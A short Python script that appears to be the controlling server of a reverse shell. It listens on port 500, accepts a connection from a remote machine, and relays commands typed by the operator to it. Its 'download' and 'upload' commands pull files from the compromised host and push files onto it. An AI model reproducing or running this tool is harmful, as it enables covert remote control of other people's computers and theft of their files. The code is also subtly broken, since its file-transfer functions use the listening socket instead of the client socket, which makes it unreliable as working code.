import socket 
import json
import os



SEVER_HOST = "0.0.0.0"
SEVER_PORT = 500
BUFER_SIZE = 1024 * 128
SEPERATOR = "<sep>"
S = socket.socket()
S.bind((SEVER_HOST, SEVER_PORT))
S.listen(5)
print(f"Listening as {SEVER_HOST}:{SEVER_PORT} .... ")

client_socket, clien_address = S.accept()
cmd = client_socket.recv(BUFER_SIZE).decode()
print("[+] Current working directory: ", cmd)



def upload_file(file_name):
    f = open(file_name, 'rb')
    S.send(f.read())



def download_file(file_name):
    f = open(file_name, 'wb')
    S.settimeout(1)
    chunk = S.recv(1024)
    while chunk:
        f.write(chunk)
        try:
            chunk = S.recv(1024)
        except socket.timeout as e:
            break
    S.settimeout(None)
    f.close()



while True:
    command = input(f"{cmd} $> ")
    if not command.strip():
        continue
    client_socket.send(command.encode())
        
    if command.lower()  == "exit":
        break
    elif command[:8] == 'download':
        download_file(command[9:])
    elif command[:6] == 'upload':
        upload_file(command[7:])
    output = client_socket.recv(BUFER_SIZE).decode()

    results, cmd = output.split(SEPERATOR)
    print(results)
